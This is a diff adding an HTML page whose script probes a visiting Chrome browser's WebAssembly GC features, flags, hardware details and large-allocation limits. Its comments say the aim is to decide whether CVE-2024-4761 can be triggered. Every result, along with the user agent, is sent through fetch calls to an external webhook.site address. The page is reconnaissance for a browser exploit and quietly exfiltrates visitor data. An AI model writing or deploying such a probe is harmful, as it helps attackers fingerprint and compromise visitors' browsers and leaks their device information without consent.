@@ -1,0 +1,74 @@
+<html><body><script>
+// w1: WebAssembly capability probe (WasmGC / typed refs / flags) - decides if CVE-2024-4761 is triggerable
+// Chrome 118 = WasmGC shipped in 119 => may be OFF. One render per boot.
+var SINK = 'https://webhook.site/11a48cd2-f8e7-445d-96a7-313df77aa438';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), {mode:'no-cors'}); } catch(e) {}
+}
+function leb(n){ var b = []; do { var x = n & 0x7f; n >>>= 7; if (n) x |= 0x80; b.push(x); } while (n); return b; }
+function F(a){ return [].concat.apply([], a); }
+function vec(items){ return leb(items.length).concat(F(items)); }
+function sec(id, payload){ return [id].concat(leb(payload.length), payload); }
+var HDR = [0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00];
+
+function mkTypeOnly(typeBytes){ return new Uint8Array(HDR.concat(sec(1, vec([typeBytes])))); }
+function mkGcFunc(op){ // op = array.new_default opcode immediate
+  var mod = HDR.slice();
+  mod = mod.concat(sec(1, vec([[0x5E,0x7F,0x01], [0x60,0x00,0x01,0x64,0x00]]))); // 0: array(mut i32), 1: ()->(ref 0)
+  mod = mod.concat(sec(3, vec([[1]])));                                          // func -> type 1
+  mod = mod.concat(sec(7, vec([[0x02,0x6d,0x6b,0x00,0x00]])));                   // export "mk"
+  var body = [0x00, 0x41,0x00, 0xFB, op, 0x00, 0x0B];                            // i32.const 0; array.new_default 0
+  mod = mod.concat(sec(10, vec([leb(body.length).concat(body)])));
+  return new Uint8Array(mod);
+}
+function mkControl(){ // plain (module (func)) - always valid
+  var mod = HDR.slice();
+  mod = mod.concat(sec(1, vec([[0x60,0x00,0x00]])));
+  mod = mod.concat(sec(3, vec([[0]])));
+  var body = [0x00, 0x0B];
+  mod = mod.concat(sec(10, vec([leb(body.length).concat(body)])));
+  return new Uint8Array(mod);
+}
+
+beacon('start', (navigator.userAgent || '').slice(0,110));
+
+// --- control ---
+try { beacon('ctl', 'validate=' + WebAssembly.validate(mkControl())); } catch(e){ beacon('ctl', 'ERR ' + String(e).slice(0,60)); }
+
+// --- GC type support (type section only) ---
+try { beacon('t-array', WebAssembly.validate(mkTypeOnly([0x5E,0x7F,0x01]))); } catch(e){ beacon('t-array', 'ERR ' + String(e).slice(0,50)); }
+try { beacon('t-struct', WebAssembly.validate(mkTypeOnly([0x5F,0x01,0x7F,0x01]))); } catch(e){ beacon('t-struct', 'ERR ' + String(e).slice(0,50)); }
+try { beacon('t-typeref', WebAssembly.validate(mkTypeOnly([0x60,0x01,0x63,0x01,0x00]))); } catch(e){ beacon('t-typeref', 'ERR ' + String(e).slice(0,50)); }
+
+// --- GC function (array.new_default opcode variants) ---
+var ops = [0x01, 0x06, 0x07, 0x0C];
+for (var i = 0; i < ops.length; i++) {
+  var op = ops[i], ok = 'n/a';
+  try { ok = WebAssembly.validate(mkGcFunc(op)); } catch(e){ ok = 'ERR ' + String(e).slice(0,40); }
+  beacon('gcfn-' + op.toString(16), ok);
+}
+
+// --- if any gcfn works, try instantiate + call ---
+try {
+  var m = new WebAssembly.Module(mkGcFunc(0x01));
+  var inst = new WebAssembly.Instance(m, {});
+  var r = inst.exports.mk();
+  beacon('gcinst', 'ok typeof=' + (typeof r) + ' ctor=' + Object.prototype.toString.call(r).slice(0,30));
+} catch(e) { beacon('gcinst', 'ERR ' + String(e).slice(0,80)); }
+
+// --- flags / other features ---
+beacon('flags', JSON.stringify({
+  mb: typeof WebAssembly.ModuleBuilder,
+  fn: typeof WebAssembly.Function,
+  tag: typeof WebAssembly.Tag,
+  jspi: typeof WebAssembly.Suspending,
+  eh: typeof WebAssembly.Exception,
+  hc: navigator.hardwareConcurrency || -1,
+  dm: navigator.deviceMemory || -1
+}).slice(0,150));
+
+// --- big allocations (gc_major needs ~2GB) ---
+function ab(n, label){ try { var b = new ArrayBuffer(n); return label + '=ok'; } catch(e){ return label + '=' + e.name; } }
+beacon('ab2g', ab(0x7FE00000, '2G'));
+beacon('done', 'w1-complete');
+</script></body></html>
